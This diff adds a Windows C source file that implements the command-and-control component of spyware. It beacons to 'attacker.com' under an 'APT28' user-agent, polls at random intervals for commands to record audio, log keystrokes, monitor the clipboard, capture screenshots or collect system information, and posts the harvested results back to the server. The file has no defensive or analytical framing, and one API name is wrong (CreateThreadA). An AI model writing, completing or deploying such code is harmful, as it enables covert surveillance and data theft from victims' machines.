@@ -1,0 +1,288 @@
+#include <windows.h>
+#include <wininet.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "ws2_32.lib")
+
+// Define C2 server endpoint
+#define C2_SERVER "http://attacker.com"
+#define C2_PORT 80
+
+// Command enumeration
+typedef enum {
+    CMD_AUDIO_RECORD = 1,
+    CMD_CLIPBOARD_MONITOR = 2,
+    CMD_KEYLOGGER = 3,
+    CMD_SCREENSHOT = 4,
+    CMD_INFO_COLLECT = 5,
+    CMD_NONE = 0
+} CapabilityCommand;
+
+// Forward declarations of capability functions
+char* start_audio_recorder();
+char* start_clipboard_monitor();
+char* start_keylogger();
+char* start_screenshot();
+char* start_info_collector();
+
+// Make HTTP GET request and get response
+char* http_get_request(const char *server, int port, const char *path) {
+    HINTERNET hInternet = NULL;
+    HINTERNET hConnect = NULL;
+    HINTERNET hRequest = NULL;
+    char *response = (char *)malloc(4096);
+    DWORD bytes_read = 0;
+    
+    if (!response) {
+        printf("[!] Memory allocation failed\n");
+        return NULL;
+    }
+    
+    hInternet = InternetOpenA("APT28/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) {
+        printf("[!] InternetOpen failed\n");
+        free(response);
+        return NULL;
+    }
+    
+    hConnect = InternetConnectA(hInternet, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) {
+        printf("[!] InternetConnect failed\n");
+        InternetCloseHandle(hInternet);
+        free(response);
+        return NULL;
+    }
+    
+    hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, 0, 0);
+    if (!hRequest) {
+        printf("[!] HttpOpenRequest failed\n");
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        free(response);
+        return NULL;
+    }
+    
+    if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
+        printf("[!] HttpSendRequest failed\n");
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        free(response);
+        return NULL;
+    }
+    
+    // Read response
+    if (!InternetReadFile(hRequest, response, 4096 - 1, &bytes_read)) {
+        printf("[!] InternetReadFile failed\n");
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        free(response);
+        return NULL;
+    }
+    
+    response[bytes_read] = '\0';
+    
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+    
+    return response;
+}
+
+// Make HTTP POST request
+int http_post_request(const char *server, int port, const char *path, const char *data) {
+    HINTERNET hInternet = NULL;
+    HINTERNET hConnect = NULL;
+    HINTERNET hRequest = NULL;
+    DWORD data_len = strlen(data);
+    char headers[] = "Content-Type: application/json\r\n";
+    
+    hInternet = InternetOpenA("APT28/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInternet) {
+        printf("[!] InternetOpen failed\n");
+        return 0;
+    }
+    
+    hConnect = InternetConnectA(hInternet, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) {
+        printf("[!] InternetConnect failed\n");
+        InternetCloseHandle(hInternet);
+        return 0;
+    }
+    
+    hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, NULL, 0, 0);
+    if (!hRequest) {
+        printf("[!] HttpOpenRequest failed\n");
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return 0;
+    }
+    
+    if (!HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, data_len)) {
+        printf("[!] HttpSendRequest failed\n");
+        InternetCloseHandle(hRequest);
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return 0;
+    }
+    
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+    
+    return 1;
+}
+
+// Register with C2 server
+int register_with_c2(const char *client_id) {
+    char path[256];
+    char *response;
+    
+    snprintf(path, sizeof(path), "/api/register?id=%s", client_id);
+    response = http_get_request(C2_SERVER, C2_PORT, path);
+    
+    if (response) {
+        free(response);
+        return 1;
+    }
+    
+    return 0;
+}
+
+// Fetch capability command from C2 server
+CapabilityCommand fetch_capability_command(const char *client_id) {
+    char path[256];
+    char *response;
+    int command_id = CMD_NONE;
+    
+    snprintf(path, sizeof(path), "/api/command?id=%s", client_id);
+    response = http_get_request(C2_SERVER, C2_PORT, path);
+    
+    if (response && strlen(response) > 0) {
+        command_id = atoi(response);
+        free(response);
+        return (CapabilityCommand)command_id;
+    }
+    
+    if (response) {
+        free(response);
+    }
+    return CMD_NONE;
+}
+
+// Report capability execution result to C2 server
+int report_capability_result(const char *client_id, CapabilityCommand cmd, const char *result) {
+    char path[256] = "/api/report";
+    
+    if (!result) {
+        return 0;
+    }
+    
+    // For large results (base64 encoded audio/screenshots), send in chunks if needed
+    // Calculate payload size
+    size_t result_len = strlen(result);
+    size_t payload_size = result_len + 512;  // Extra space for JSON structure
+    
+    char *payload = (char*)malloc(payload_size);
+    if (!payload) {
+        return 0;
+    }
+    
+    // Build JSON payload with result field (matches server expectation)
+    snprintf(payload, payload_size,
+             "{\"id\":\"%s\",\"capability\":%d,\"result\":\"%s\"}",
+             client_id, cmd, result);
+    
+    int ret = http_post_request(C2_SERVER, C2_PORT, path, payload);
+    free(payload);
+    
+    return ret;
+}
+
+// Execute capability based on command
+char* execute_capability(CapabilityCommand cmd) {
+    char *output = NULL;
+    
+    switch (cmd) {
+        case CMD_AUDIO_RECORD:
+            output = start_audio_recorder();
+            break;
+        case CMD_CLIPBOARD_MONITOR:
+            output = start_clipboard_monitor();
+            break;
+        case CMD_KEYLOGGER:
+            output = start_keylogger();
+            break;
+        case CMD_SCREENSHOT:
+            output = start_screenshot();
+            break;
+        case CMD_INFO_COLLECT:
+            output = start_info_collector();
+            break;
+        default:
+            break;
+    }
+    
+    return output;
+}
+
+// Generate random sleep interval between 60 and 120 seconds
+int get_random_interval() {
+    srand((unsigned int)time(NULL) + rand());
+    return 60 + (rand() % 61);  // 60-120 seconds
+}
+
+// Main C2 communication loop (runs in separate thread)
+DWORD WINAPI c2_communication_thread(LPVOID arg) {
+    char client_id[64];
+    CapabilityCommand cmd;
+    char *output = NULL;
+    
+    // Generate unique client ID
+    snprintf(client_id, sizeof(client_id), "APT28_%d_%ld", GetCurrentProcessId(), time(NULL));
+    
+    // Register with C2 server
+    register_with_c2(client_id);
+    
+    // Main C2 loop
+    while (1) {
+        // Get random interval between 60 and 120 seconds
+        int sleep_interval = get_random_interval();
+        Sleep(sleep_interval * 1000);  // Convert to milliseconds for Windows Sleep()
+        
+        // Fetch capability command from C2
+        cmd = fetch_capability_command(client_id);
+        
+        if (cmd != CMD_NONE) {
+            // Execute the capability and capture output
+            output = execute_capability(cmd);
+            
+            if (output) {
+                // Report result back to C2 with output data
+                report_capability_result(client_id, cmd, output);
+                
+                // Free the output buffer
+                free(output);
+                output = NULL;
+            }
+        }
+    }
+    
+    return 0;
+}
+
+// Start C2 handler in a background thread
+int start_c2_handler() {
+    HANDLE hThread = CreateThreadA(NULL, 0, c2_communication_thread, NULL, 0, NULL);
+    if (!hThread) {
+        return 0;
+    }
+    
+    CloseHandle(hThread);
+    return 1;
+}
